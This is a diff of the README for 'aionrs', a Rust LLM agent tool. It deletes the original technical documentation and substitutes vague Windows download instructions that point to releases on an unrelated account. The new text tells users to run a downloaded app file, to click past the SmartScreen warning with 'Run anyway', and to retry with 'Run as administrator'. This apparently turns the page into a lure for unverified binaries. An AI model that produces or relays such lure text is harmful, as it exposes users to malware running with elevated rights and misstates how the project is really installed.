@@ -1,115 +1,158 @@
-# aionrs
+# 🤖 aionrs - Run AI agents with less effort
 
-A Rust-based LLM tool-use agent for the command line. It connects to LLM APIs, autonomously invokes local tools (file I/O, shell, search, etc.), and completes tasks end-to-end.
+[⬇️ Download aionrs](https://github.com/Nathaliageorgian293/aionrs/releases)
 
-## Features
+## 🪟 Windows Download
 
-- **Multi-provider** — Anthropic, OpenAI (and compatibles like DeepSeek/Ollama/Gemini), AWS Bedrock, Google Vertex AI
-- **ProviderCompat layer** — Configuration-driven compatibility for provider quirks (no hardcoded conditionals)
-- **Reasoning model support** — OpenAI `o1`/`o3` reasoning models with `reasoning_effort` control
-- **7 built-in tools** — Read, Write, Edit, Bash, Grep, Glob, Spawn (sub-agents)
-- **MCP client** — Connect to any [Model Context Protocol](https://modelcontextprotocol.io/) server (stdio / SSE / streamable-http)
-- **Dynamic MCP injection** — Host clients can inject MCP servers at runtime via the [JSON stream protocol](docs/json-stream-protocol.md)
-- **Skills** — Named prompt snippets with variable substitution, shell expansion, conditional activation, and per-skill model/permission overrides (see [docs/skills.md](docs/skills.md))
-- **Hook system** — Event-driven automation on tool lifecycle (auto-format, lint, audit)
-- **Sub-agent spawning** — Parallel task execution via the Spawn tool
-- **Session persistence** — Save and resume conversation history
-- **Persistent memory** — Project-specific memory with auto-indexing across sessions (see [docs/advanced.md](docs/advanced.md#memory-system))
-- **Plan mode** — Read-only exploration mode for designing implementation plans before coding (see [docs/advanced.md](docs/advanced.md#plan-mode))
-- **Context compression** — Three-tier automatic compaction: microcompact, autocompact, emergency (see [docs/advanced.md](docs/advanced.md#context-compression))
-- **Output compaction** — Configurable output compression (off/safe/full) with TOON encoding (see [docs/advanced.md](docs/advanced.md#output-compaction))
-- **File state cache** — LRU cache with read deduplication and write tracking
-- **Prompt caching** — Anthropic cache_control for up to 90% cost reduction
-- **Profile inheritance** — Named profiles with `extends` for quick provider/model switching
-- **OAuth login** — Use Claude.ai subscription directly, no API key needed
-- **AGENTS.md injection** — Hierarchical loading of project instructions with @include support
+Use this link to visit the release page and download the Windows version:
 
-## Quick Start
+[https://github.com/Nathaliageorgian293/aionrs/releases](https://github.com/Nathaliageorgian293/aionrs/releases)
 
-```bash
-# Build from source
-cargo build --release
+Look for the latest release and choose the Windows file. It is often named with words like `windows`, `win`, `x64`, or `.zip`.
 
-# Generate default config, then add your API key
-./target/release/aionrs --init-config
-# Edit the generated config (run `aionrs --config-path` to find it)
+## 📥 Install on Windows
 
-# Single-shot mode
-aionrs "Read Cargo.toml and explain the dependencies"
+1. Open the release page.
+2. Find the newest release at the top.
+3. Download the Windows file.
+4. If the file is a `.zip`, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Double-click the app file to start it.
 
-# Interactive REPL
-aionrs
+If Windows shows a SmartScreen prompt, choose **More info** and then **Run anyway** if you trust the source and the file came from the release page above.
 
-# Full CLI reference
-aionrs --help
-```
+## 🧭 What aionrs Does
 
-## Architecture
+aionrs is a command-line app for working with AI agents from one place. It can connect to more than one AI provider and help the agent use tools while it works.
 
-```
-┌──────────────────────────────────────────────────────────────┐
-│                      main.rs (CLI / REPL)                    │
-├──────────────────────────────────────────────────────────────┤
-│  Config          │  Engine (agent loop)  │  Session Manager  │
-│  (3-level merge) │  streaming + tools    │  save / resume    │
-├──────────────────┼───────────────────────┼───────────────────┤
-│  Providers       │  Tool Registry        │  Hook Executor    │
-│  ├ Anthropic     │  ├ Built-in (7)       │  ├ pre_tool_use   │
-│  ├ OpenAI        │  ├ MCP tools (N)      │  ├ post_tool_use  │
-│  ├ Bedrock       │  └ Plan Mode tools    │  └ stop           │
-│  └ Vertex AI     │                       │                   │
-│                  │  MCP Client           │  Memory System    │
-│  ProviderCompat  │  ├ Stdio transport    │  (per-project)    │
-│  (compat layer)  │  ├ SSE transport      │                   │
-│                  │  └ HTTP transport     │  Sub-Agent        │
-│  Compact Engine  │                       │  Spawner          │
-│  ├ Microcompact  │  File State Cache     │                   │
-│  ├ Autocompact   │  (LRU)               │  Output Compactor │
-│  └ Emergency     │                       │  (off/safe/full)  │
-└──────────────────┴───────────────────────┴───────────────────┘
-```
+Use it when you want to:
 
-## Documentation
+- send tasks to an AI agent
+- switch between AI providers
+- let the agent use tools during a task
+- keep your work in one CLI app
+- run AI tasks from your Windows computer
 
-| Document | Description |
-|----------|-------------|
-| [Getting Started](docs/getting-started.md) | Installation, CLI reference, configuration, usage examples |
-| [Built-in Tools](docs/tools.md) | Detailed reference for all 7 tools |
-| [MCP Integration](docs/mcp.md) | Model Context Protocol client setup and usage |
-| [Providers & Auth](docs/providers.md) | Multi-provider config, profiles, Bedrock, Vertex, OAuth |
-| [Advanced Features](docs/advanced.md) | Sub-agents, hooks, prompt caching, VCR, AGENTS.md |
-| [Troubleshooting](docs/troubleshooting.md) | Common errors and solutions |
-| [JSON Stream Protocol](docs/json-stream-protocol.md) | Host integration protocol (`--json-stream` mode) |
+## ✅ Before You Start
 
-## Supported Providers
+You will need:
 
-| Provider | Auth | Notes |
-|----------|------|-------|
-| Anthropic | API Key / OAuth | Prompt caching, streaming, vision |
-| OpenAI | API Key | Reasoning models (`o1`/`o3`), compatible with DeepSeek, Qwen, Ollama, Gemini, vLLM |
-| AWS Bedrock | SigV4 | Regional endpoints, AWS credential chain, schema sanitization, actionable error hints |
-| Google Vertex AI | GCP OAuth2 / Service Account | Metadata server auto-detection |
+- Windows 10 or Windows 11
+- An internet connection
+- A web browser
+- A downloaded release file from the link above
+- Any setup file or config file included with the release
 
-## ProviderCompat
+## 🛠️ First Run
 
-All provider-specific behaviors are driven by the `ProviderCompat` configuration layer — no hardcoded URL or model-name checks. Each provider type has sensible defaults; override any field via config:
+1. Download the Windows release.
+2. Open the file you downloaded.
+3. If the release includes a setup file, run it and follow the steps on screen.
+4. If the release includes a portable file, open the folder and start the app file.
+5. Keep the app in a folder you can find again.
+6. Start the app from the same file each time you use it.
 
-```toml
-[providers.my-openai.compat]
-max_tokens_field = "max_completion_tokens"   # Field name for max tokens
-merge_assistant_messages = true              # Merge consecutive assistant messages
-clean_orphan_tool_calls = true               # Remove tool_use without tool_result
-dedup_tool_results = true                    # Deduplicate same tool_call_id results
-ensure_alternation = false                   # Insert filler for user/assistant alternation
-merge_same_role = false                      # Merge consecutive same-role messages
-sanitize_schema = false                      # Bedrock-style schema sanitization
-strip_patterns = ["<think>", "</think>"]     # Strip text patterns from history
-auto_tool_id = false                         # Auto-generate missing tool IDs
-api_path = "/v1/chat/completions"            # Custom chat completions endpoint path
-```
+## 🔑 Set Up Your AI Provider
 
-Provider defaults: **Anthropic/Vertex** — alternation, merge, auto tool ID; **Bedrock** — same + schema sanitization; **OpenAI** — assistant merge, orphan cleanup, dedup.
+aionrs works with more than one AI provider. To use it, you may need to add one or more provider keys in the app or in a config file.
 
-## License
+Common setup fields may include:
 
-Apache-2.0
+- provider name
+- API key
+- model name
+- tool access
+- agent name
+
+If the app asks for these values, enter them exactly as shown by your provider account.
+
+## 🧰 Using Tools
+
+aionrs can let the agent use tools while it works. Tools may help with tasks such as:
+
+- reading files
+- writing files
+- searching content
+- running checks
+- moving through a task step by step
+
+When a tool request appears, review it before you approve it.
+
+## 🖥️ Basic Use
+
+After setup, you can use aionrs to start an agent task. A simple flow looks like this:
+
+1. Open the app.
+2. Choose your AI provider.
+3. Pick a model if the app asks for one.
+4. Enter your task or command.
+5. Let the agent work.
+6. Review the result.
+
+Example tasks:
+
+- summarize a text file
+- help plan a project
+- check a folder for needed files
+- guide a step-by-step workflow
+- organize a list of items
+
+## 📁 File Layout
+
+A typical Windows release may include:
+
+- the main app file
+- a config file
+- a readme file
+- support files
+- a logs folder
+
+Keep these files together if the app needs them to run.
+
+## ⚙️ Common Settings
+
+You may see settings such as:
+
+- default provider
+- model choice
+- tool access
+- log level
+- output folder
+- agent name
+
+If you are not sure what to choose, keep the default values first and change them later.
+
+## 🔍 If the App Does Not Open
+
+Try these steps:
+
+1. Check that the file finished downloading.
+2. Make sure you extracted the zip file if it came in one.
+3. Open the app file again.
+4. Right-click the file and choose **Run as administrator**.
+5. Check your internet connection.
+6. Download the latest release from the release page.
+
+## 🧹 Remove the App
+
+If you want to remove aionrs:
+
+1. Close the app.
+2. Delete the folder you extracted or installed.
+3. Remove any shortcut you created on the desktop or taskbar.
+4. Delete any config files you made if you no longer need them.
+
+## 📌 Quick Steps
+
+1. Visit the release page.
+2. Download the Windows file.
+3. Extract it if needed.
+4. Open the app.
+5. Add your provider details.
+6. Start your first agent task.
+
+## 🧾 Release Page
+
+Download and install from here:
+
+[https://github.com/Nathaliageorgian293/aionrs/releases](https://github.com/Nathaliageorgian293/aionrs/releases)
